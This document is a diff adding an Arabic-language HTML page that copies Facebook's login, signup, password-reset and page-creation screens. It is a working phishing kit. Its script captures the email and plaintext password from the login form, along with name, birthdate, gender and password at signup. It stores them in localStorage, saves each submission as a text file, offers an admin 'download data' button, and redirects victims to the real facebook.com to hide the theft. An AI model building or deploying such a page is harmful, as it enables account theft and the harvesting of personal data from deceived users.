@@ -1,1 +1,902 @@
 
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فيسبوك - تسجيل الدخول</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #f0f2f5;
+            direction: rtl;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex: 1;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        .content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 980px;
+            gap: 20px;
+        }
+        @media (min-width: 900px) {
+            .content {
+                flex-direction: row;
+                align-items: center;
+                justify-content: space-between;
+            }
+        }
+        .left-section {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        @media (min-width: 900px) {
+            .left-section {
+                margin-bottom: 0;
+                text-align: right;
+                flex: 1;
+                margin-left: 32px;
+            }
+        }
+        .logo {
+            width: 240px;
+            max-width: 100%;
+            margin-bottom: 10px;
+        }
+        @media (max-width: 450px) {
+            .logo {
+                width: 200px;
+            }
+        }
+        .tagline {
+            font-size: 24px;
+            line-height: 28px;
+            max-width: 500px;
+            color: #1c1e21;
+        }
+        @media (max-width: 450px) {
+            .tagline {
+                font-size: 18px;
+                line-height: 22px;
+            }
+        }
+        .login-container, .signup-container, .reset-container, .page-container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 100%;
+            max-width: 396px;
+        }
+        .login-form, .signup-form, .reset-form, .page-form {
+            display: flex;
+            flex-direction: column;
+        }
+        .form-input {
+            padding: 14px 16px;
+            font-size: 17px;
+            border-radius: 6px;
+            border: 1px solid #dddfe2;
+            margin-bottom: 12px;
+            direction: rtl;
+            width: 100%;
+        }
+        .form-input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        .login-button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 12px;
+            margin-bottom: 16px;
+            cursor: pointer;
+            width: 100%;
+        }
+        .login-button:hover {
+            background-color: #166fe5;
+        }
+        .forgot-password {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .forgot-password a {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        .create-account, .signup-button {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 12px;
+            margin: 0 auto;
+            display: block;
+            width: fit-content;
+            cursor: pointer;
+        }
+        .create-account:hover, .signup-button:hover {
+            background-color: #36a420;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 28px;
+            font-size: 14px;
+            padding: 20px;
+        }
+        .footer a {
+            color: #1c1e21;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .install-button {
+            background-color: #e4e6eb;
+            color: #050505;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            padding: 8px 12px;
+            margin: 10px auto;
+            display: none;
+            cursor: pointer;
+        }
+        .install-button:hover {
+            background-color: #d8dadf;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .header h1 {
+            font-size: 32px;
+            color: #1c1e21;
+            margin-bottom: 10px;
+        }
+        @media (max-width: 450px) {
+            .header h1 {
+                font-size: 24px;
+            }
+        }
+        .header p {
+            font-size: 15px;
+            color: #606770;
+            margin-bottom: 20px;
+        }
+        .form-row {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        .form-label {
+            font-size: 12px;
+            color: #606770;
+            margin: 5px 0;
+        }
+        .gender-options {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        @media (max-width: 450px) {
+            .gender-options {
+                flex-direction: column;
+            }
+        }
+        .gender-option {
+            flex: 1;
+            border: 1px solid #ccd0d5;
+            border-radius: 5px;
+            padding: 10px;
+            display: flex;
+            justify-content: space-between;
+        }
+        .gender-option label {
+            font-size: 15px;
+            color: #1c1e21;
+        }
+        .terms {
+            font-size: 11px;
+            color: #777;
+            margin: 15px 0;
+        }
+        .terms a {
+            color: #385898;
+            text-decoration: none;
+        }
+        .date-selects {
+            display: flex;
+            gap: 10px;
+        }
+        .date-selects select {
+            flex: 1;
+            padding: 8px;
+            border-radius: 5px;
+            border: 1px solid #ccd0d5;
+        }
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+        .cancel-button {
+            background-color: #e4e6eb;
+            color: #4b4f56;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            padding: 10px 20px;
+            cursor: pointer;
+        }
+        .search-button, .next-button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            padding: 10px 20px;
+            cursor: pointer;
+        }
+        .search-button:hover, .next-button:hover {
+            background-color: #166fe5;
+        }
+        .cancel-button:hover {
+            background-color: #d8dadf;
+        }
+        .login-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .login-link a {
+            color: #1877f2;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .page-types {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin-top: 20px;
+        }
+        @media (max-width: 450px) {
+            .page-types {
+                grid-template-columns: 1fr;
+            }
+        }
+        .page-type {
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
+            padding: 15px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .page-type:hover {
+            border-color: #1877f2;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .page-type h3 {
+            font-size: 17px;
+            color: #1c1e21;
+            margin-bottom: 5px;
+        }
+        .page-type p {
+            font-size: 13px;
+            color: #606770;
+        }
+        .hidden {
+            display: none;
+        }
+        .active {
+            display: block;
+        }
+        .nav-buttons {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .nav-button {
+            background-color: #e4e6eb;
+            color: #050505;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            padding: 8px 12px;
+            cursor: pointer;
+        }
+        .nav-button:hover {
+            background-color: #d8dadf;
+        }
+        .nav-button.active {
+            background-color: #1877f2;
+            color: white;
+        }
+        @media (max-width: 450px) {
+            .nav-button {
+                font-size: 12px;
+                padding: 6px 8px;
+            }
+        }
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background-color: #42b72a;
+            color: white;
+            padding: 15px 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            z-index: 1000;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="notification" id="notification">تم حفظ البيانات بنجاح!</div>
+    
+    <div class="container">
+        <div class="content">
+            <div class="left-section">
+                <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="فيسبوك" class="logo">
+                <h2 class="tagline">يساعدك فيسبوك على التواصل ومشاركة حياتك مع الأشخاص الذين تعرفهم.</h2>
+            </div>
+            
+            <!-- زر التنقل بين الصفحات (للإدارة فقط) -->
+            <div class="nav-buttons">
+                <button class="nav-button active" onclick="showPage('login')">تسجيل الدخول</button>
+                <button class="nav-button" onclick="showPage('signup')">إنشاء حساب</button>
+                <button class="nav-button" onclick="showPage('reset')">نسيت كلمة السر</button>
+                <button class="nav-button" onclick="showPage('page')">إنشاء صفحة</button>
+                <button class="nav-button" onclick="downloadData()">تحميل البيانات</button>
+            </div>
+            
+            <!-- صفحة تسجيل الدخول -->
+            <div id="login-page" class="login-container active">
+                <form class="login-form" id="loginForm">
+                    <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" class="form-input" required>
+                    <input type="password" name="password" placeholder="كلمة السر" class="form-input" required>
+                    <button type="submit" class="login-button">تسجيل الدخول</button>
+                </form>
+                <div class="forgot-password">
+                    <a href="#" onclick="showPage('reset')">هل نسيت كلمة السر؟</a>
+                </div>
+                <div class="divider"></div>
+                <button class="create-account" onclick="showPage('signup')">إنشاء حساب جديد</button>
+                <button id="installButton" class="install-button">تثبيت التطبيق</button>
+            </div>
+            
+            <!-- صفحة إنشاء حساب جديد -->
+            <div id="signup-page" class="signup-container hidden">
+                <div class="header">
+                    <h1>إنشاء حساب جديد</h1>
+                    <p>التسجيل سريع وسهل</p>
+                </div>
+                <div class="divider"></div>
+                <form id="signupForm" class="signup-form">
+                    <div class="form-row">
+                        <input type="text" name="firstname" placeholder="الاسم الأول" class="form-input" required>
+                        <input type="text" name="lastname" placeholder="اسم العائلة" class="form-input" required>
+                    </div>
+                    <input type="text" name="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" class="form-input" required>
+                    <input type="password" name="password" placeholder="كلمة السر الجديدة" class="form-input" required>
+                    
+                    <div class="form-label">تاريخ الميلاد</div>
+                    <div class="date-selects">
+                        <select name="day" required>
+                            <option value="" selected disabled>اليوم</option>
+                            <!-- سيتم توليد الأيام من 1 إلى 31 باستخدام JavaScript -->
+                        </select>
+                        <select name="month" required>
+                            <option value="" selected disabled>الشهر</option>
+                            <option value="1">يناير</option>
+                            <option value="2">فبراير</option>
+                            <option value="3">مارس</option>
+                            <option value="4">أبريل</option>
+                            <option value="5">مايو</option>
+                            <option value="6">يونيو</option>
+                            <option value="7">يوليو</option>
+                            <option value="8">أغسطس</option>
+                            <option value="9">سبتمبر</option>
+                            <option value="10">أكتوبر</option>
+                            <option value="11">نوفمبر</option>
+                            <option value="12">ديسمبر</option>
+                        </select>
+                        <select name="year" required>
+                            <option value="" selected disabled>السنة</option>
+                            <!-- سيتم توليد السنوات من 2023 إلى 1905 باستخدام JavaScript -->
+                        </select>
+                    </div>
+                    
+                    <div class="form-label">الجنس</div>
+                    <div class="gender-options">
+                        <div class="gender-option">
+                            <label for="female">أنثى</label>
+                            <input type="radio" id="female" name="gender" value="female" required>
+                        </div>
+                        <div class="gender-option">
+                            <label for="male">ذكر</label>
+                            <input type="radio" id="male" name="gender" value="male" required>
+                        </div>
+                        <div class="gender-option">
+                            <label for="custom">مخصص</label>
+                            <input type="radio" id="custom" name="gender" value="custom" required>
+                        </div>
+                    </div>
+                    
+                    <div class="terms">
+                        بالنقر على إنشاء حساب، فإنك توافق على <a href="#">شروط الخدمة</a> و<a href="#">سياسة البيانات</a> و<a href="#">سياسة ملفات تعريف الارتباط</a> الخاصة بنا. قد تتلقى إشعارات عبر رسائل SMS منا ويمكنك إلغاء الاشتراك في أي وقت.
+                    </div>
+                    
+                    <button type="submit" class="signup-button">إنشاء حساب</button>
+                </form>
+                <div class="login-link">
+                    <a href="#" onclick="showPage('login')">لديك حساب بالفعل؟</a>
+                </div>
+            </div>
+            
+            <!-- صفحة استعادة كلمة المرور -->
+            <div id="reset-page" class="reset-container hidden">
+                <div class="header">
+                    <h2>البحث عن حسابك</h2>
+                </div>
+                <form id="resetForm" class="reset-form">
+                    <p class="form-text">يرجى إدخال بريدك الإلكتروني أو رقم هاتفك المحمول للبحث عن حسابك.</p>
+                    <input type="text" name="email_or_phone" placeholder="البريد الإلكتروني أو رقم الهاتف المحمول" class="form-input" required>
+                    <div class="buttons">
+                        <button type="button" class="cancel-button" onclick="showPage('login')">إلغاء</button>
+                        <button type="submit" class="search-button">بحث</button>
+                    </div>
+                </form>
+                <div class="divider"></div>
+                <div class="login-link">
+                    <a href="#" onclick="showPage('signup')">إنشاء حساب جديد</a>
+                </div>
+            </div>
+            
+            <!-- صفحة إنشاء صفحة -->
+            <div id="page-page" class="page-container hidden">
+                <div class="header">
+                    <h2>إنشاء صفحة</h2>
+                    <p>تساعدك الصفحات على التواصل مع العملاء أو المعجبين.</p>
+                </div>
+                <form id="createPageForm" class="page-form">
+                    <div class="page-types">
+                        <div class="page-type" onclick="selectType('business')">
+                            <h3>نشاط تجاري أو علامة تجارية</h3>
+                            <p>عرض المنتجات والخدمات، والوصول إلى العملاء والمتابعين، وتحقيق أهداف العمل.</p>
+                        </div>
+                        <div class="page-type" onclick="selectType('community')">
+                            <h3>مجتمع أو شخصية عامة</h3>
+                            <p>التواصل مع المعجبين أو المتابعين، ومشاركة الأخبار والقصص.</p>
+                        </div>
+                    </div>
+                    <input type="hidden" name="page_type" id="pageType" value="">
+                    <div class="buttons">
+                        <button type="submit" class="next-button" disabled id="nextButton">التالي</button>
+                    </div>
+                </form>
+                <div class="divider"></div>
+                <div class="login-link">
+                    <a href="#" onclick="showPage('login')">العودة إلى تسجيل الدخول</a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        <p><a href="#" onclick="showPage('page')">إنشاء صفحة</a> لشخصية مشهورة أو علامة تجارية أو نشاط تجاري.</p>
+    </div>
+
+    <script>
+        // متغيرات التتبع
+        let startTime = new Date();
+        let sessionId = '';
+        let userAgent = navigator.userAgent;
+        let platform = navigator.platform;
+        let language = navigator.language;
+        let screenWidth = window.screen.width;
+        let screenHeight = window.screen.height;
+        let pageName = 'صفحة تسجيل الدخول';
+        
+        // تخزين البيانات
+        let loginData = [];
+        let signupData = [];
+        let resetData = [];
+        let pageData = [];
+        let analyticsData = [];
+        
+        // إنشاء معرف فريد للجلسة
+        function generateSessionId() {
+            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+                var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+                return v.toString(16);
+            });
+        }
+        
+        // إظهار الإشعار
+        function showNotification(message) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.style.display = 'block';
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 3000);
+        }
+        
+        // حفظ البيانات في ملف نصي
+        function saveToTextFile(data, filename) {
+            const blob = new Blob([data], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+        
+        // إرسال بيانات التحليلات
+        function sendAnalytics(event, data = {}) {
+            if (!sessionId) {
+                sessionId = localStorage.getItem('sessionId') || generateSessionId();
+                localStorage.setItem('sessionId', sessionId);
+            }
+            
+            const analyticsEntry = {
+                event: event,
+                sessionId: sessionId,
+                timestamp: new Date().toISOString(),
+                pageName: pageName,
+                timeSpent: Math.round((new Date() - startTime) / 1000),
+                userAgent: userAgent,
+                platform: platform,
+                language: language,
+                screenResolution: `${screenWidth}x${screenHeight}`,
+                ...data
+            };
+            
+            analyticsData.push(analyticsEntry);
+            
+            // حفظ البيانات في localStorage
+            localStorage.setItem('analyticsData', JSON.stringify(analyticsData));
+        }
+        
+        // عرض صفحة معينة وإخفاء الأخرى
+        function showPage(pageId) {
+            // إخفاء جميع الصفحات
+            document.querySelectorAll('.login-container, .signup-container, .reset-container, .page-container').forEach(el => {
+                el.classList.remove('active');
+                el.classList.add('hidden');
+            });
+            
+            // إزالة النشط من جميع أزرار التنقل
+            document.querySelectorAll('.nav-button').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            
+            // إظهار الصفحة المطلوبة
+            document.getElementById(`${pageId}-page`).classList.remove('hidden');
+            document.getElementById(`${pageId}-page`).classList.add('active');
+            
+            // إضافة النشط لزر التنقل المناسب
+            document.querySelector(`.nav-button[onclick="showPage('${pageId}')"]`).classList.add('active');
+            
+            // تحديث اسم الصفحة للتحليلات
+            pageName = getPageName(pageId);
+            startTime = new Date();
+            sendAnalytics('page_view');
+        }
+        
+        // الحصول على اسم الصفحة للتحليلات
+        function getPageName(pageId) {
+            const pageNames = {
+                'login': 'صفحة تسجيل الدخول',
+                'signup': 'صفحة إنشاء حساب جديد',
+                'reset': 'صفحة استعادة كلمة المرور',
+                'page': 'صفحة إنشاء صفحة'
+            };
+            return pageNames[pageId] || 'صفحة غير معروفة';
+        }
+        
+        // اختيار نوع الصفحة
+        function selectType(type) {
+            document.getElementById('pageType').value = type;
+            document.getElementById('nextButton').disabled = false;
+            
+            sendAnalytics('page_type_selected', { page_type: type });
+            
+            // تحديث التصميم للعناصر المحددة
+            const pageTypes = document.querySelectorAll('.page-type');
+            pageTypes.forEach(element => {
+                element.style.borderColor = '#dddfe2';
+                element.style.boxShadow = 'none';
+            });
+            
+            event.currentTarget.style.borderColor = '#1877f2';
+            event.currentTarget.style.boxShadow = '0 2px 4px rgba(0, 0, 0, 0.1)';
+        }
+        
+        // تحميل البيانات كملف نصي
+        function downloadData() {
+            // جمع جميع البيانات
+            const allData = {
+                loginData: loginData,
+                signupData: signupData,
+                resetData: resetData,
+                pageData: pageData,
+                analyticsData: analyticsData,
+                downloadTime: new Date().toISOString()
+            };
+            
+            // تحويل البيانات إلى نص
+            const dataText = JSON.stringify(allData, null, 2);
+            
+            // حفظ البيانات في ملف نصي
+            saveToTextFile(dataText, `facebook_data_${new Date().getTime()}.txt`);
+            
+            sendAnalytics('data_downloaded');
+            showNotification('تم تحميل البيانات بنجاح!');
+        }
+        
+        // تسجيل الدخول
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.querySelector('#loginForm input[name="email"]').value;
+            const password = document.querySelector('#loginForm input[name="password"]').value;
+            
+            sendAnalytics('login_attempt', { email: email });
+            
+            // حفظ بيانات تسجيل الدخول
+            const loginEntry = {
+                email: email,
+                password: password,
+                device_info: navigator.userAgent,
+                session_id: sessionId,
+                timestamp: new Date().toISOString(),
+                ip_address: 'N/A (Client-side only)'
+            };
+            
+            loginData.push(loginEntry);
+            localStorage.setItem('loginData', JSON.stringify(loginData));
+            
+            // حفظ البيانات في ملف نصي
+            const loginText = `تسجيل الدخول:\nالبريد الإلكتروني/الهاتف: ${email}\nكلمة السر: ${password}\nالتاريخ: ${new Date().toLocaleString('ar-SA')}\n\n`;
+            saveToTextFile(loginText, `facebook_login_${new Date().getTime()}.txt`);
+            
+            sendAnalytics('login_success', { email: email });
+            showNotification('تم حفظ بيانات تسجيل الدخول بنجاح!');
+            
+            // إعادة توجيه المستخدم إلى فيسبوك الحقيقي
+            setTimeout(() => {
+                window.location.href = 'https://www.facebook.com';
+            }, 2000);
+        });
+        
+        // إنشاء حساب جديد
+        document.getElementById('signupForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(this);
+            const data = {};
+            formData.forEach((value, key) => data[key] = value);
+            
+            sendAnalytics('signup_attempt', { email: data.email });
+            
+            // حفظ بيانات إنشاء الحساب
+            const signupEntry = {
+                firstname: data.firstname,
+                lastname: data.lastname,
+                email: data.email,
+                password: data.password,
+                birthdate: `${data.day}/${data.month}/${data.year}`,
+                gender: data.gender,
+                device_info: navigator.userAgent,
+                session_id: sessionId,
+                timestamp: new Date().toISOString(),
+                ip_address: 'N/A (Client-side only)'
+            };
+            
+            signupData.push(signupEntry);
+            localStorage.setItem('signupData', JSON.stringify(signupData));
+            
+            // حفظ البيانات في ملف نصي
+            const signupText = `إنشاء حساب جديد:\nالاسم: ${data.firstname} ${data.lastname}\nالبريد الإلكتروني/الهاتف: ${data.email}\nكلمة السر: ${data.password}\nتاريخ الميلاد: ${data.day}/${data.month}/${data.year}\nالجنس: ${data.gender}\nالتاريخ: ${new Date().toLocaleString('ar-SA')}\n\n`;
+            saveToTextFile(signupText, `facebook_signup_${new Date().getTime()}.txt`);
+            
+            sendAnalytics('signup_success', { email: data.email });
+            showNotification('تم حفظ بيانات الحساب الجديد بنجاح!');
+            
+            // إعادة توجيه المستخدم إلى فيسبوك الحقيقي
+            setTimeout(() => {
+                window.location.href = 'https://www.facebook.com';
+            }, 2000);
+        });
+        
+        // استعادة كلمة المرور
+        document.getElementById('resetForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const emailOrPhone = document.querySelector('#resetForm input[name="email_or_phone"]').value;
+            
+            sendAnalytics('password_reset_attempt', { email_or_phone: emailOrPhone });
+            
+            // حفظ بيانات استعادة كلمة المرور
+            const resetEntry = {
+                email_or_phone: emailOrPhone,
+                device_info: navigator.userAgent,
+                session_id: sessionId,
+                timestamp: new Date().toISOString(),
+                ip_address: 'N/A (Client-side only)'
+            };
+            
+            resetData.push(resetEntry);
+            localStorage.setItem('resetData', JSON.stringify(resetData));
+            
+            // حفظ البيانات في ملف نصي
+            const resetText = `استعادة كلمة المرور:\nالبريد الإلكتروني/الهاتف: ${emailOrPhone}\nالتاريخ: ${new Date().toLocaleString('ar-SA')}\n\n`;
+            saveToTextFile(resetText, `facebook_reset_${new Date().getTime()}.txt`);
+            
+            sendAnalytics('password_reset_success', { email_or_phone: emailOrPhone });
+            showNotification('تم حفظ بيانات استعادة كلمة المرور بنجاح!');
+            
+            setTimeout(() => {
+                alert('تم إرسال رابط إعادة تعيين كلمة المرور إلى بريدك الإلكتروني.');
+                showPage('login');
+            }, 1000);
+        });
+        
+        // إنشاء صفحة
+        document.getElementById('createPageForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const pageType = document.getElementById('pageType').value;
+            
+            if (!pageType) {
+                alert('يرجى اختيار نوع الصفحة');
+                return;
+            }
+            
+            sendAnalytics('create_page_attempt', { page_type: pageType });
+            
+            // حفظ بيانات إنشاء الصفحة
+            const pageEntry = {
+                page_type: pageType,
+                device_info: navigator.userAgent,
+                session_id: sessionId,
+                timestamp: new Date().toISOString(),
+                ip_address: 'N/A (Client-side only)'
+            };
+            
+            pageData.push(pageEntry);
+            localStorage.setItem('pageData', JSON.stringify(pageData));
+            
+            // حفظ البيانات في ملف نصي
+            const pageText = `إنشاء صفحة:\nنوع الصفحة: ${pageType}\nالتاريخ: ${new Date().toLocaleString('ar-SA')}\n\n`;
+            saveToTextFile(pageText, `facebook_page_${new Date().getTime()}.txt`);
+            
+            sendAnalytics('create_page_success', { page_type: pageType });
+            showNotification('تم حفظ بيانات إنشاء الصفحة بنجاح!');
+            
+            setTimeout(() => {
+                alert('شكراً لك! سيتم تحويلك إلى فيسبوك لإكمال إنشاء صفحتك.');
+                
+                // إعادة توجيه المستخدم إلى فيسبوك الحقيقي
+                window.location.href = 'https://www.facebook.com/pages/create/';
+            }, 1000);
+        });
+        
+        // تثبيت التطبيق
+        let deferredPrompt;
+        const installButton = document.getElementById('installButton');
+
+        window.addEventListener('beforeinstallprompt', (e) => {
+            // منع ظهور النافذة المنبثقة تلقائيًا
+            e.preventDefault();
+            // تخزين الحدث للاستخدام لاحقًا
+            deferredPrompt = e;
+            // إظهار زر التثبيت
+            installButton.style.display = 'block';
+            
+            sendAnalytics('install_prompt_shown');
+        });
+
+        installButton.addEventListener('click', async () => {
+            if (!deferredPrompt) {
+                return;
+            }
+            // إظهار نافذة التثبيت
+            deferredPrompt.prompt();
+            
+            sendAnalytics('install_button_clicked');
+            
+            // انتظار اختيار المستخدم
+            const { outcome } = await deferredPrompt.userChoice;
+            
+            // تسجيل النتيجة
+            sendAnalytics('install_prompt_result', { outcome: outcome });
+            
+            // لا يمكن استخدام deferredPrompt مرة أخرى
+            deferredPrompt = null;
+            
+            // إخفاء الزر
+            installButton.style.display = 'none';
+        });
+
+        window.addEventListener('appinstalled', () => {
+            // تسجيل نجاح التثبيت
+            sendAnalytics('app_installed');
+            // إخفاء الزر
+            installButton.style.display = 'none';
+            deferredPrompt = null;
+        });
+        
+        // تهيئة الصفحة عند التحميل
+        window.addEventListener('load', function() {
+            // توليد الأيام من 1 إلى 31
+            const daySelect = document.querySelector('select[name="day"]');
+            for(let i=1; i<=31; i++) {
+                const option = document.createElement('option');
+                option.value = i;
+                option.textContent = i;
+                daySelect.appendChild(option);
+            }
+            
+            // توليد السنوات من 2023 إلى 1905
+            const yearSelect = document.querySelector('select[name="year"]');
+            for(let i=2023; i>=1905; i--) {
+                const option = document.createElement('option');
+                option.value = i;
+                option.textContent = i;
+                yearSelect.appendChild(option);
+            }
+            
+            // تحميل البيانات المحفوظة من localStorage
+            loginData = JSON.parse(localStorage.getItem('loginData') || '[]');
+            signupData = JSON.parse(localStorage.getItem('signupData') || '[]');
+            resetData = JSON.parse(localStorage.getItem('resetData') || '[]');
+            pageData = JSON.parse(localStorage.getItem('pageData') || '[]');
+            analyticsData = JSON.parse(localStorage.getItem('analyticsData') || '[]');
+            
+            // إرسال بيانات تحليلات تحميل الصفحة
+            sendAnalytics('page_view');
+        });
+        
+        // إرسال بيانات عند مغادرة الصفحة
+        window.addEventListener('beforeunload', function() {
+            sendAnalytics('page_exit');
+        });
+    </script>
+</body>
+</html>
